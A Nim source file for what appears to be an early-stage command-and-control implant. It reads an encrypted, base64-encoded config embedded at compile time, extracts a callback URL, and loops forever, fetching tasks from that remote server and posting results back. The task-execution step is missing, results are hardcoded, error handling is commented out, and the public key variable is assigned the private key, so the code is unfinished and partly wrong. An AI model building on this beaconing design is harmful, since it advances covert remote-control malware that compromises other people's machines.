import asyncdispatch, asyncnet
import sysrandom
import std/base64
import std/strutils
import std/os
#third party libraries
import puppy #http comms library
import monocypher
import protocol
import flatty
import tasks
import urlly
import config
import configjs
import types 

import std/[streams, osproc]

const LOOKUP_TABLE =
    when defined(release):
        staticRead("../release.config")
    else:
        staticRead("../debug.config")

# removes null characters from the url string
proc rmURLNulls(url: string): string =
  var newUrl = ""
  for c in url:
    if c != '\0':
      newUrl.add(c)
  return newUrl

#retrieves all of the tasks for the agent  
proc getTasks(agent: StaticConfig): Task = 
  let url = urlly.parseUrl(rmURLNulls(agent.callback))
  echo "get task: ", $url
  let task = fetch($url)
  echo task 
  let dec = task.fromFlatty(Task)
  return dec
  
#posts the task results for the agent
proc postResult(agent: StaticConfig, taskID: string, taskResult: string): string = 
  let url = urlly.parseUrl(rmURLNulls(agent.callback))

  let body = Resp(taskId: taskID, resp: "COMPLETE")
  echo "post response: ", $url
  let response = post(
      $url,
      @[("Content-Type", "application/json")],
      toFlatty(body)
  )   

proc main() =
  let ub64Str = unb64str(LOOKUP_TABLE)
  let encConfig = ub64Str.fromFlatty(EncConfig)
  let context = readEncConfig(encConfig)
  
  let pubKey = encConfig.privKey
  let privKey = encConfig.privKey
  echo context.callback
  while(true):
    # try: 
      let task = getTasks(context)
      echo task
      let result = postResult(context, task.taskId,"COMPLETE")
      echo result
    # except PuppyError: #TODO add error logging, handling
      echo "error"

when isMainModule:
  
  main()
